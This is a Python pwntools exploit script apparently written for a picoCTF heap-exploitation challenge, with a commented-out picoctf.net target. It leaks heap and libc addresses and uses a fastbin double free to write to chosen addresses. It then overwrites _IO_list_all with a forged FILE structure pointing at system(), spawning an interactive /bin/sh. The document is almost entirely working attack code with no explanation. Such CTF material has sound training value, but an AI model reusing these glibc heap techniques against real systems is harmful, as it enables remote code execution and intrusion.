from pwn import *

HOST, PORT = '0.0.0.0', 31337
# HOST, PORT = 'fickle-tempest.picoctf.net', 54316
r = remote(HOST, PORT)

def add(size, data):
    r.sendlineafter('> ', '1')
    r.sendlineafter('> ', f'{size}')
    r.sendlineafter('> ', data)

def free(idx):
    r.sendlineafter('> ', '2')
    r.sendlineafter('> ', str(idx))

def introduce(data):
    r.sendlineafter('> ', data)

def reintroduce(data):
    r.sendlineafter('> ', '3')
    r.sendlineafter('> ', data)

introduce(b'test')
RETME = 0x602130
SMALLBIN = 0x602050

add(50, b'')
reintroduce(b'A' * (0x100-1))
r.recvuntil(b'A\n')
heap_leak = u64(r.recvline().strip(b'!\n').ljust(8, b'\x00'))
heap_base = heap_leak - 0x10

payload = p64(0) + p64(0xc1) + p64(0) * 22 + p64(0xc1) + p64(0x31) + p64(0) * 5 + p64(0x41)
print(len(payload))
reintroduce(payload[:-1])

add(50, b'')
add(50, b'')
free(0)
free(1)
free(0)
add(50, p64(RETME))
add(50, b'')
add(50, b'')
add(50, p64(SMALLBIN))
free(0)

reintroduce(b'A' * 15)
r.recvuntil(b'A\n')
main_arena_88 = u64(r.recvline().strip(b'!\n').ljust(8, b'\x00'))
libc_base = main_arena_88 - 0x3c4b78
IO_list_all = libc_base + 0x3c5520
system = libc_base + 0x45390

payload = b'/bin/sh\x00' + p64(0x61)
payload += p64(0xdeadbeef) + p64(IO_list_all-0x10)
payload += p64(2) + p64(3)
payload += p64(system)*18
payload += p64(0) + p64(0)
payload += p64(0) + p64(0x602040+0x60)

reintroduce(payload)

r.sendlineafter(b'> ', b'1')
r.sendlineafter(b'> ', b'40')
r.interactive()